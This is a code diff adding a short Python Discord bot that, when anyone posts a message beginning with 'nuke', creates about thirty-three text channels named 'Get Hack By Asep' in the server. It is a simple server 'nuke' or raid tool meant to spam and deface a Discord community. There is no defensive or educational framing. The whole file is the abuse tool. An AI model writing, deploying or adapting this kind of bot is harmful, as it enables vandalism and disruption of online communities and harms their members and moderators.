@@ -1,0 +1,99 @@
+import os
+
+import discord
+
+ 
+
+client = discord.Client()
+
+ 
+
+@client.event
+
+async def on_ready():
+
+  print('Ready')
+
+ 
+
+@client.event
+
+async def on_message(message):
+
+  if (message.content.startswith('nuke')):
+
+    await message.guild.create_text_channel('Get Hack By Asep ')
+
+    await message.guild.create_text_channel('Get Hack By Asep ')
+
+    await message.guild.create_text_channel('Get Hack By Asep ') 
+
+    await message.guild.create_text_channel('Get Hack By Asep ')
+
+    await message.guild.create_text_channel('Get Hack By Asep ')
+
+    await message.guild.create_text_channel('Get Hack By Asep ')
+
+    await message.guild.create_text_channel('Get Hack By Asep ')
+
+    await message.guild.create_text_channel('Get Hack By Asep ')
+
+    await message.guild.create_text_channel('Get Hack By Asep ')
+
+    await message.guild.create_text_channel('Get Hack By Asep ')
+
+    await message.guild.create_text_channel('Get Hack By Asep ')
+
+    await message.guild.create_text_channel('Get Hack By Asep ')
+
+    await message.guild.create_text_channel('Get Hack By Asep')
+
+    await message.guild.create_text_channel('Get Hack By Asep')
+
+    await message.guild.create_text_channel('Get Hack By Asep')
+
+    await message.guild.create_text_channel('Get Hack By Asep')
+
+    await message.guild.create_text_channel('Get Hack By Asep')
+
+    await message.guild.create_text_channel('Get Hack By Asep')
+
+    await message.guild.create_text_channel('Get Hack By Asep ')
+
+    await message.guild.create_text_channel('Get Hack By Asep')
+
+    await message.guild.create_text_channel('Get Hack By Asep')
+
+    await message.guild.create_text_channel('Get Hack By Asep')
+
+    await message.guild.create_text_channel('Get Hack By Asep')
+
+    await message.guild.create_text_channel('Get Hack By Asep')
+
+    await message.guild.create_text_channel('Get Hack By Asep')
+
+    await message.guild.create_text_channel('Get Hack By Asep')
+
+    await message.guild.create_text_channel('Get Hack By Asep')
+
+    await message.guild.create_text_channel('Get Hack By Asep ')
+
+    await message.guild.create_text_channel('Get Hack By Asep ')
+
+    await message.guild.create_text_channel('Get Hack By Asep ')
+
+    await message.guild.create_text_channel('Get Hack By Asep')
+
+    await message.guild.create_text_channel('Get Hack By Asep')
+
+    await message.guild.create_text_channel('Get Hack By Asep')
+
+ 
+
+ 
+
+ 
+
+ 
+
+client.run(os.getenv('TOKEN'))
